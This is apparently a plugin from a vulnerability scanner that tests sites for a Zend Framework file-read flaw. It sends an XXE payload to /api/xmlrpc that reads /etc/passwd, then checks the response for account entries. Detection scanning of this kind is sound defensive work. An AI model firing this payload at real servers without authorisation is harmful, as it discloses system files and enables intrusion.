#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http, ob):
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        result = []
        header = {
            "Host": ob['domain'],
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": ob.get('cookie') if ob.get('cookie') else '',
            # "Connection": "keep-alive"
        }
        body = '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY >" \
                                  "<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>" \
                                                                          "<methodCall>" \
                                                                          "<methodName>&xxe;</methodName>" \
                                                                          "</methodCall>'
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        new_url = "%s://%s/api/xmlrpc" % (scheme, domain)
        res, content = http.request(new_url, 'POST', body, header)
        if res and res.has_key('status') and res['status'] == '200':
            keyword = re.search(r'(root:|bin:|nobody:)', content)
            if keyword:
                response = getResponse(res, content, keywords='(root:|bin:|nobody:)')
                request = getRequest(new_url, domain=ob['domain'])
                detail = "存在Zend Framework任意文件读取漏洞"
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                return result
    except Exception, e:
        logger.error("File:ZendFrameworkReadfileScript_yd.py, run_domain function :%s" % (str(e)))
        return []
